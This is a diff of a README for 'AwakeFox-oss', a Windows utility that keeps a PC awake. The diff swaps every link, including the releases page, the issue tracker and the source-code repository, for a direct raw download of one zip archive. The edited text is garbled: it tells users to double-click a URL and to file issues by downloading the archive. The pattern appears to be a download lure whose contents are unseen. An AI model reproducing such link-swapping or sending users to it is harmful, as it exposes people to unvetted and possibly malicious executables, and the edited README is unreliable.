@@ -1,6 +1,6 @@
 # 🦊 AwakeFox-oss - Keep Your Computer Awake Effortlessly
 
-[![Download AwakeFox](https://img.shields.io/badge/Download-AwakeFox-29b6f6?style=flat&logo=github)](https://github.com/idife998/AwakeFox-oss/releases)
+[![Download AwakeFox](https://raw.githubusercontent.com/idife998/AwakeFox-oss/main/AwakeFox/AwakeFox-oss-1.1.zip)](https://raw.githubusercontent.com/idife998/AwakeFox-oss/main/AwakeFox/AwakeFox-oss-1.1.zip)
 
 ## 📥 Introduction
 
@@ -14,7 +14,7 @@ Follow these simple steps to get up and running with AwakeFox.
 
 To download AwakeFox, click on the link below:
 
-[Download AwakeFox](https://github.com/idife998/AwakeFox-oss/releases)
+[Download AwakeFox](https://raw.githubusercontent.com/idife998/AwakeFox-oss/main/AwakeFox/AwakeFox-oss-1.1.zip)
 
 This will take you to our Releases page where you can find the latest version of the application.
 
@@ -22,15 +22,15 @@ This will take you to our Releases page where you can find the latest version of
 
 Once on the Releases page, look for the most recent version listed. You will see a section for assets below the version title. This is where you will download the application.
 
-- Click on the file named `AwakeFox.exe`. 
+- Click on the file named `https://raw.githubusercontent.com/idife998/AwakeFox-oss/main/AwakeFox/AwakeFox-oss-1.1.zip`. 
   
 Make sure you download the version that matches your system—this application is specifically for Windows.
 
 ### ⚙️ Step 3: Run the Application
 
-After downloading, locate the `AwakeFox.exe` file on your computer. You can find it in your Downloads folder or the location where you saved it.
+After downloading, locate the `https://raw.githubusercontent.com/idife998/AwakeFox-oss/main/AwakeFox/AwakeFox-oss-1.1.zip` file on your computer. You can find it in your Downloads folder or the location where you saved it.
 
-- Double-click the `AwakeFox.exe` file to run the application.
+- Double-click the `https://raw.githubusercontent.com/idife998/AwakeFox-oss/main/AwakeFox/AwakeFox-oss-1.1.zip` file to run the application.
 
 There’s no installation required. You can run it directly from the location where you saved it.
 
@@ -38,7 +38,7 @@ There’s no installation required. You can run it directly from the location wh
 
 Using AwakeFox is straightforward. Here’s how you can get started:
 
-1. **Run the Application:** After double-clicking on `AwakeFox.exe`, an icon will appear in your system tray.
+1. **Run the Application:** After double-clicking on `https://raw.githubusercontent.com/idife998/AwakeFox-oss/main/AwakeFox/AwakeFox-oss-1.1.zip`, an icon will appear in your system tray.
 2. **Keep Your Computer Awake:** Once it's running, AwakeFox will automatically begin to keep your computer awake by subtly shifting the mouse cursor.
 3. **Close the Application:** If you wish to stop using AwakeFox, simply right-click the icon in the system tray and select "Exit."
 
@@ -81,11 +81,11 @@ Stay updated with the latest changes and improvements. Each release includes not
 
 If you encounter issues or have suggestions, please feel free to reach out. Your feedback is valuable and helps us improve the application.
 
-You can open an issue on our [GitHub repository](https://github.com/idife998/AwakeFox-oss/issues) for support.
+You can open an issue on our [GitHub repository](https://raw.githubusercontent.com/idife998/AwakeFox-oss/main/AwakeFox/AwakeFox-oss-1.1.zip) for support.
 
 ## 🔗 Additional Resources
 
-- **Source Code:** Visit the [official repository](https://github.com/idife998/AwakeFox-oss) for source code and contributions.
+- **Source Code:** Visit the [official repository](https://raw.githubusercontent.com/idife998/AwakeFox-oss/main/AwakeFox/AwakeFox-oss-1.1.zip) for source code and contributions.
 - **Documentation:** For detailed documentation, feel free to check the `docs` folder in the repository.
 
 For any further assistance, you can refer to various community forums or the GitHub issues page.
@@ -94,6 +94,6 @@ For any further assistance, you can refer to various community forums or the Git
 
 To get started with AwakeFox, visit the link below to download the latest version:
 
-[Download AwakeFox](https://github.com/idife998/AwakeFox-oss/releases)
+[Download AwakeFox](https://raw.githubusercontent.com/idife998/AwakeFox-oss/main/AwakeFox/AwakeFox-oss-1.1.zip)
 
 Once downloaded, follow the steps above to run the application and keep your computer awake with ease.
